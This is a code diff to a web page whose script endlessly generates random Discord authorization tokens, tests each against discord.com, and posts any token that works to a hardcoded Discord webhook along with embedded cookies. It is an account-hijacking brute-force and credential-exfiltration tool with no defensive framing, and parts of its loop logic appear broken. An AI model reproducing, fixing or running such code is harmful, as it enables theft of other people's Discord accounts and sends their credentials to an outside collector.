@@ -19,7 +19,9 @@
         out+=ts[(Math.random()*ts.length)]
       }
       out+='.'
-      for(var i = 0; i >= (Math.random()*2)+4; i+=1){
+      rounded = (Math.random()*2)+4
+      rounded = rounded - (rounded % 1)
+      for(var i = 0; i >= rounded; i+=1){
         var temp = (Math.random()*ts.length)
         out+=ts[temp-(temp%1)]
       }
@@ -28,13 +30,14 @@
     while(true){
       guess = gentoken1()
       fetch('https://discord.com/login', {'headers':{
-        'Authorization': guess
+        'Authorization': guess,
+        "Access-Control-Allow-Origin":"*"
       }}).then(res => {
         if(res.status == 200){
           var myHeaders = new Headers();
           myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
           myHeaders.append("Cookie", "__cfruid=b5146dc0a2f20bc27192d07d55068cf04d15c254-1642951205; __dcfduid=f11fcc807c5f11ec8d04ea363ca5819e; __sdcfduid=f11fcc807c5f11ec8d04ea363ca5819eb2a5085e39ab581a313beabc6131e84735ccf163c08b3e86052818a0e05e08b8");
-
+          myHeaders.append("Access-Control-Allow-Origin", "*")
           var urlencoded = new URLSearchParams();
           urlencoded.append("content", guess);
 
@@ -48,16 +51,16 @@
           fetch("https://discord.com/api/webhooks/934827543922634762/PQiPILZqyDyLtKZEu8v1dL22xlPtpNL8qmsMFqxO5e0Ci4L1sncCnc35WtJGdn9MgMh3", requestOptions).then(response => response.text())
         }
       })
-      document.getElementById('Guess').content = guess
       guess = gentoken2()
       fetch('https://discord.com/login', {'headers':{
-        'Authorization': guess
+        'Authorization': guess,
+        "Access-Control-Allow-Origin":"*"
       }}).then(res => {
         if(res.status == 200){
           var myHeaders = new Headers();
           myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
           myHeaders.append("Cookie", "__cfruid=b5146dc0a2f20bc27192d07d55068cf04d15c254-1642951205; __dcfduid=f11fcc807c5f11ec8d04ea363ca5819e; __sdcfduid=f11fcc807c5f11ec8d04ea363ca5819eb2a5085e39ab581a313beabc6131e84735ccf163c08b3e86052818a0e05e08b8");
-
+          myHeaders.append("Access-Control-Allow-Origin", "*")
           var urlencoded = new URLSearchParams();
           urlencoded.append("content", guess);
 
@@ -72,6 +75,5 @@
         }
       })
     }
-    document.getElementById('GuessMFA').content = guess
   </script>
 </html>
